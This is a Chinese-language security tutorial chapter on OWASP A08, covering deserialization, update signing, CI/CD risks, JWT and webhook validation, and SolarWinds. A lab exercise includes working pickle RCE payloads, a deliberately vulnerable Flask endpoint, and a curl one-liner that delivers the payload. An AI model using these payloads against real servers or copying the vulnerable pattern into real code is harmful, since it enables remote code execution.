# Ch 13 — A08 Software & Data Integrity Failures

> 目標：搞懂 unsigned software update、insecure deserialization、CI/CD 攻擊面。

> **2025 變動**：編號跟名稱都不變。注意：2025 把「Software Supply Chain Failures」拉成 A03（見 Ch 6），跟本章有部分重疊 — A03 著重 dependency / build pipeline 入侵的廣面，A08 著重「信不該信的東西」這個機制（簽章驗證、deserialization）。

## A08 是什麼

「**信任不該信任的 software 或 data**」：

- 從沒簽章的 source 載 update
- deserialize untrusted data
- CI/CD pipeline 被攻擊
- auto-update 機制不安全

OWASP 2021 新加，反映現代 supply chain attack 趨勢；2025 沿用本類別 + 加開 A03 Software Supply Chain Failures 處理更廣的鏈條問題。

## 1. Insecure Deserialization

「**deserialization**」 = 把 byte stream 還原成 object。

```python
import pickle

# Python pickle
data = pickle.loads(user_supplied_bytes)   # 危險！
```

`pickle` 在 deserialize 時**會執行 code**。攻擊者能造 evil pickle：

```python
import pickle
import os

class Evil:
    def __reduce__(self):
        return (os.system, ('rm -rf /tmp/lol',))

evil_data = pickle.dumps(Evil())
# 這個 byte 給 server pickle.loads → server 執行 rm
```

### 各語言常見 unsafe deserializer

| 語言 | unsafe |
|---|---|
| Python | `pickle`, `yaml.load()`（不指定 SafeLoader）, `marshal` |
| Java | `ObjectInputStream` |
| PHP | `unserialize()` |
| .NET | `BinaryFormatter`, `XmlSerializer`（某些用法） |
| Ruby | `Marshal.load`, YAML |
| JavaScript | (基本沒這問題，但 `eval()` 算) |

### 防禦

**永遠不對 untrusted data deserialize**。

替代：

- 用 JSON / Protobuf（safe，純資料）
- 如果非 pickle 不可，sign + verify

## 2. Insecure Auto-Update

軟體 auto update：下載新版本 → install。

如果**沒簽章驗證** → attacker MITM → 推 evil update → RCE。

著名例子：**SolarWinds（2020）**

- IT management 工具 SolarWinds Orion
- 攻擊者入侵 SolarWinds build pipeline
- 把 backdoor 植入官方 build
- **18,000 客戶**（含 US 政府機構）裝 evil update
- 後門 dormant 6 個月才 activate
- 美國史上最大 supply chain attack

教訓：

- Build pipeline 安全跟 production 同等重要
- code signing + verify
- reproducible builds（任何人能重 build 確認 binary 一致）

### Auto-update 防禦

- HTTPS（防 MITM）
- 簽章 verify（拿到 binary 後 check signature）
- pinning public key（防 CA 被攻）
- staged rollout（先小比例，異常 stop）

## 3. CI/CD Pipeline 安全

CI/CD 系統 = 「**自動跑 untrusted code 的 server**」。攻擊面：

### a) PR 自動 build untrusted code

```yaml
# .github/workflows/test.yml
on: [pull_request]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - run: npm install && npm test
```

任何外部 PR → CI 跑攻擊者 code（在 npm scripts / test 裡）。

GitHub Actions 預設 secrets 不對 fork PR 暴露，但仍然能：

- 跑 cryptominer
- 攻擊 internal network
- 改 build artifact

修：

- `pull_request_target` 反而更危險（小心用）
- review PR 才 trigger build
- limit secrets 到必要 workflow

### b) Action / Plugin 攻擊

```yaml
- uses: random-author/random-action@main
```

`@main` 抓最新版 → maintainer 推 evil → 你 build 跑 evil。

修：pin 到 commit SHA：

```yaml
- uses: random-author/random-action@abc123def456...   # full SHA
```

### c) Secret leak

build log 印出 secret：

```yaml
- run: echo "API_KEY=$API_KEY"   # 災難
```

modern CI（GitHub Actions）會 mask secret，但**不保證**。

修：

- 不在 log 中 print secret
- 不在 PR description / issue 中 paste secret
- secret rotate

### d) Code Review bypass

「**只有 admin 能 merge**」防護不夠：

- admin 帳號被偷 → 直接 merge
- branch protection 規則漏設
- protected branch 預設規則弱

修：

- branch protection 強規則
- multi-reviewer required
- signed commits required
- admin 也要 PR

### e) Release 簽章

production release 該簽章：

```bash
# 用 cosign sign container image
cosign sign --key cosign.key your-registry/image:tag

# verify
cosign verify --key cosign.pub your-registry/image:tag
```

或用 sigstore（OIDC + ephemeral key）。

## 4. JSON Web Token Trust

某些系統信任 JWT 來自「可信 issuer」，但驗證鬆：

```python
# 爛
payload = jwt.decode(token, secret, algorithms=['HS256'])
# 沒 verify issuer / audience / expiration
```

修：

```python
payload = jwt.decode(
    token, secret,
    algorithms=['RS256'],
    audience='my-app',
    issuer='https://expected-issuer.com',
    options={'require_exp': True, 'verify_signature': True}
)
```

## 5. Webhook / Callback 沒驗證

Webhook 從外部接 event：

```python
@app.route('/webhook/github', methods=['POST'])
def webhook():
    event = request.json
    if event['action'] == 'merge':
        deploy()
```

attacker 直接 POST → trigger deploy。

修：

- 驗 GitHub signature header (`X-Hub-Signature-256`)
- 用 webhook secret

```python
import hmac, hashlib

def verify_signature(payload, signature, secret):
    expected = 'sha256=' + hmac.new(secret.encode(), payload, hashlib.sha256).hexdigest()
    return hmac.compare_digest(expected, signature)
```

## 真實案例：SolarWinds（再講）

2020 年發現的攻擊：

```
1. attacker 進 SolarWinds 開發環境（怎麼進有多種說法）
2. 改 SolarWinds Orion 的 build process
3. 編譯時注入 backdoor (SUNBURST)
4. 後門通過 SolarWinds 自家 code signing → 看起來合法
5. 客戶下載 update → 安裝有後門的版本
6. 後門 dormant 12-14 天才 phone home
7. 選擇性 activate 高價值目標（FireEye / 美國財政部 / 國土安全部 / Microsoft / ...）
```

「**世紀級 supply chain attack**」。

教訓：

- Build infra 跟 prod 同等保護
- reproducible builds（讓 evil binary 容易被發現）
- runtime detection（後門有 phone-home 行為）
- zero trust（即使 signed package 也驗證行為）

## 動手練習

**1. Pickle RCE**

```python
# attacker.py
import pickle, os, base64

class Evil:
    def __reduce__(self):
        return (os.system, ('id > /tmp/pwned',))

payload = pickle.dumps(Evil())
print(base64.b64encode(payload).decode())
```

```python
# vulnerable_server.py
from flask import Flask, request
import pickle, base64

app = Flask(__name__)

@app.route('/load', methods=['POST'])
def load():
    data = base64.b64decode(request.data)
    obj = pickle.loads(data)   # 危險！
    return 'OK'
```

```bash
# 攻擊
python3 -c '
import pickle, os, base64
class Evil:
    def __reduce__(self):
        return (os.system, ("touch /tmp/pwned",))
print(base64.b64encode(pickle.dumps(Evil())).decode())
' | curl -X POST http://localhost:5000/load --data-binary @-

ls /tmp/pwned   # 存在 → RCE 確認
```

**2. PHP unserialize**

寫類似的 PHP vulnerable script，用 `unserialize($_POST['data'])`。研究 PHP magic methods（`__wakeup`, `__destruct`）攻擊。

**3. CI/CD 自我 audit**

對自己 GitHub repo：

- workflow 用了哪些 actions？pin SHA 嗎？
- secret 怎麼管理？
- branch protection 設定？
- PR 預設 trigger workflow 嗎？

**4. cosign sign image**

```bash
# 裝 cosign
go install github.com/sigstore/cosign/v2/cmd/cosign@latest

# 生 key
cosign generate-key-pair

# Sign + verify
docker push myregistry/myimage:tag
cosign sign --key cosign.key myregistry/myimage:tag
cosign verify --key cosign.pub myregistry/myimage:tag
```

**5. webhook 驗 signature**

寫 webhook receiver，正確驗 GitHub signature。

## 自我檢核

- [ ] 知道 deserialization 為什麼能 RCE
- [ ] 各語言 unsafe deserializer 至少 3 種
- [ ] SolarWinds 攻擊大致流程
- [ ] CI/CD 5+ 種攻擊面
- [ ] 知道 cosign / sigstore 用途
- [ ] webhook signature verify 寫過

下一章看 A09 Logging & Alerting Failures（2025 把「Monitoring」改成「Alerting」，強調光記錄不夠、要能觸發告警）。

→ [Ch 14 A09 Security Logging & Alerting Failures](./14-a09-logging-alerting-failures.md)
